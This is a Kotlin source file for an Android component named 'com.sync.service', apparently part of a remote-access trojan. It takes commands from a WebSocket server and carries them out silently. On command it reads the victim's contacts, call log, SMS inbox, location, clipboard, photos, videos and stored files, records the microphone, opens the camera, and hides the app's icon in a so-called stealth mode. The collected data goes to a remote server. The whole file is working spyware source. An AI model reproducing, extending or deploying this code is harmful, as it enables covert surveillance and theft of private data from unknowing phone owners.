package com.sync.service

import android.Manifest
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Vibrator
import android.os.VibrationEffect
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val base = BuildConfig.SERVER_URL
        .replace("wss://", "https://")
        .replace("ws://", "http://")

    private val model = "${Build.MANUFACTURER} ${Build.MODEL}"
    private val TAG = "AdvHandler"

    fun handle(cmd: String) {
        try {
            when {
                cmd == "contacts"      -> sendContacts()
                cmd == "calls"         -> sendCalls()
                cmd == "messages"      -> sendMessages()
                cmd == "location"      -> sendLocation()
                cmd == "clipboard"     -> sendClipboard()
                cmd == "vibrate"       -> doVibrate()
                cmd == "camera_back"   -> captureCamera(0)
                cmd == "camera_front"  -> captureCamera(1)
                cmd.startsWith("mic")  -> recordAudio(cmd)
                cmd == "gallery"       -> sendGallery()
                cmd == "list_sdcard"   -> listSdcard()
                cmd == "hide_icon"     -> hideAppIcon()
                cmd.startsWith("list:")        -> listDir(cmd.removePrefix("list:"))
                cmd.startsWith("send_dir:")    -> sendDirFiles(cmd.removePrefix("send_dir:"))
                cmd.startsWith("send_image:")  -> sendImageById(cmd.removePrefix("send_image:").toLongOrNull() ?: 0)
                cmd.startsWith("send_video:")  -> sendVideoById(cmd.removePrefix("send_video:").toLongOrNull() ?: 0)
                cmd.startsWith("get_app_file:")-> getAppFile(cmd.removePrefix("get_app_file:"))
                cmd.startsWith("open_url:")    -> openUrl(cmd.removePrefix("open_url:"))
                cmd.startsWith("file:")        -> uploadFiles(cmd.removePrefix("file:"))
            }
        } catch (e: Exception) {}
    }

    private fun hideAppIcon() {
        try {
            val p = ctx.packageManager
            p.setComponentEnabledSetting(
                android.content.ComponentName(ctx, "${ctx.packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            postJson("/uploadText", JSONObject().apply {
                put("title", "🥷 وضع التخفي النشط")
                put("text", "تم بنجاح إخفاء أيقونة التطبيق من قائمة التطبيقات تماماً.")
                put("agentId", model)
            })
        } catch (e: Exception) {}
    }

    private fun sendContacts() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            val arr = JSONArray()
            cursor?.use {
                val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply { put("name", it.getString(nIdx) ?: ""); put("phone", it.getString(pIdx) ?: "") })
                }
            }
            postJson("/uploadContacts", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendCalls() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext() && arr.length() < 200) {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(numIdx) ?: "")
                        put("type", when (it.getInt(typeIdx)) { CallLog.Calls.INCOMING_TYPE -> "داخل"; CallLog.Calls.OUTGOING_TYPE -> "خارج"; CallLog.Calls.MISSED_TYPE -> "فائت"; else -> "أخرى" })
                        put("date", it.getLong(dateIdx)); put("duration", it.getInt(durIdx))
                    })
                }
            }
            postJson("/uploadCalls", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendMessages() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
            val arr = JSONArray()
            cursor?.use {
                val aIdx = it.getColumnIndex("address")
                val bIdx = it.getColumnIndex("body")
                val dIdx = it.getColumnIndex("date")
                while (it.moveToNext() && arr.length() < 200) {
                    arr.put(JSONObject().apply { put("from", it.getString(aIdx) ?: ""); put("body", it.getString(bIdx) ?: ""); put("date", it.getLong(dIdx)) })
                }
            }
            postJson("/uploadMessages", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendLocation() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
            LocationServices.getFusedLocationProviderClient(ctx).lastLocation.addOnSuccessListener { loc ->
                if (loc != null) sendLocToServer(loc)
            }
        } catch (e: Exception) {}
    }

    private fun sendLocToServer(loc: Location) {
        try {
            val json = JSONObject().apply { put("lat", loc.latitude); put("lon", loc.longitude); put("accuracy", loc.accuracy); put("agentId", model) }
            val req = Request.Builder().url("$base/uploadLocation").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).post(json.toString().toRequestBody("application/json".toMediaType())).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }

    private fun sendClipboard() {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val text = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "(فارغة)"
            postJson("/uploadClipboard", JSONObject().apply { put("text", text); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun doVibrate() {
        try {
            val vib = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vib.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
            else @Suppress("DEPRECATION") vib.vibrate(2000)
        } catch (e: Exception) {}
    }

    private fun captureCamera(which: Int) {
        try {
            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).putExtra("android.intent.extras.CAMERA_FACING", which).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            postJson("/uploadText", JSONObject().apply { put("title", "📸 كاميرا"); put("text", "تم فتح الكاميرا"); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun recordAudio(cmd: String) {
        try {
            val seconds = cmd.split(":").getOrNull(1)?.toIntOrNull() ?: 10
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
            val path = ctx.cacheDir.absolutePath + "/rec_${System.currentTimeMillis()}.m4a"
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(path)
            recorder.prepare(); recorder.start()
            Thread {
                Thread.sleep((seconds * 1000).toLong())
                try { recorder.stop(); recorder.release() } catch (e: Exception) {}
                val f = File(path)
                if (f.exists()) uploadFile(f)
            }.start()
        } catch (e: Exception) {}
    }

    private fun sendGallery() {
        try {
            val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE), null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.Images.Media._ID)
                val nIdx = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val sIdx = it.getColumnIndex(MediaStore.Images.Media.SIZE)
                while (it.moveToNext() && arr.length() < 100) {
                    arr.put(JSONObject().apply { put("id", it.getLong(idIdx)); put("name", it.getString(nIdx) ?: ""); put("size", it.getLong(sIdx)) })
                }
            }
            postJson("/uploadGallery", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendImageById(id: Long) {
        try {
            if (id <= 0) return
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            val inputStream = ctx.contentResolver.openInputStream(uri) ?: return
            val tempFile = File(ctx.cacheDir, "img_$id.jpg")
            tempFile.outputStream().use { inputStream.copyTo(it) }
            inputStream.close()
            uploadFile(tempFile)
        } catch (e: Exception) {}
    }

    private fun sendVideoById(id: Long) {
        try {
            if (id <= 0) return
            val uri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
            val inputStream = ctx.contentResolver.openInputStream(uri) ?: return
            val tempFile = File(ctx.cacheDir, "vid_$id.mp4")
            tempFile.outputStream().use { inputStream.copyTo(it) }
            inputStream.close()
            uploadFile(tempFile)
        } catch (e: Exception) {}
    }

    private fun listSdcard() {
        try {
            val root = Environment.getExternalStorageDirectory()
            val items = JSONArray()
            root.listFiles()?.sortedBy { it.name }?.forEach { f ->
                items.put(JSONObject().apply { put("name", f.name); put("type", if (f.isDirectory) "📁" else "📄"); put("path", f.absolutePath); put("size", if (f.isFile) f.length() else 0) })
            }
            postJson("/uploadText", JSONObject().apply { put("title", "📂 /sdcard/"); put("text", items.toString(2)); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun listDir(path: String) {
        try {
            val target = resolvePath(path) ?: return
            val items = JSONArray()
            target.listFiles()?.sortedBy { it.name }?.take(200)?.forEach { f ->
                items.put(JSONObject().apply { put("name", f.name); put("type", if (f.isDirectory) "📁" else "📄"); put("path", f.absolutePath); put("size", if (f.isFile) f.length() else 0) })
            }
            postJson("/uploadText", JSONObject().apply { put("title", "📂 ${target.absolutePath}"); put("text", items.toString(2)); put("agentId", model) })
        } catch (e: Exception) {}
    }

    private fun sendDirFiles(path: String) {
        try {
            val target = resolvePath(path) ?: return
            val files = target.listFiles()?.filter { it.isFile } ?: emptyList()
            var count = 0
            files.take(20).forEach { f ->
                if (f.length() < 20 * 1024 * 1024 && count < 20) { uploadFile(f); count++ }
            }
        } catch (e: Exception) {}
    }

    private fun getAppFile(path: String) {
        try {
            val target = File(path)
            if (!target.exists()) return
            if (target.isFile) uploadFile(target)
            else target.listFiles()?.take(20)?.forEach { f -> if (f.isFile) uploadFile(f) }
        } catch (e: Exception) {}
    }

    private fun openUrl(url: String) {
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (e: Exception) {}
    }

    private fun uploadFiles(path: String) {
        try {
            val target = resolvePath(path) ?: return
            val files = if (target.isDirectory) target.listFiles() else arrayOf(target)
            var count = 0
            files?.take(20)?.forEach { f ->
                if (f.isFile && f.length() < 20 * 1024 * 1024 && count < 20) { uploadFile(f); count++ }
            }
        } catch (e: Exception) {}
    }

    private fun resolvePath(path: String): File? {
        val p = path.trim().trimStart('/').trimEnd('/')
        val candidates = listOf(
            File("/sdcard/$p"), File("/storage/emulated/0/$p"),
            File(Environment.getExternalStorageDirectory(), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), p)
        )
        for (c in candidates) if (c.exists()) return c
        return null
    }

    private fun uploadFile(file: File) {
        try {
            val body = file.asRequestBody("application/octet-stream".toMediaType())
            val req = Request.Builder().url("$base/uploadFile").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).addHeader("model", model).post(body).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }

    private fun postJson(endpoint: String, json: JSONObject) {
        try {
            val req = Request.Builder().url("$base$endpoint").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).addHeader("model", model).post(json.toString().toRequestBody("application/json".toMediaType())).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }
}
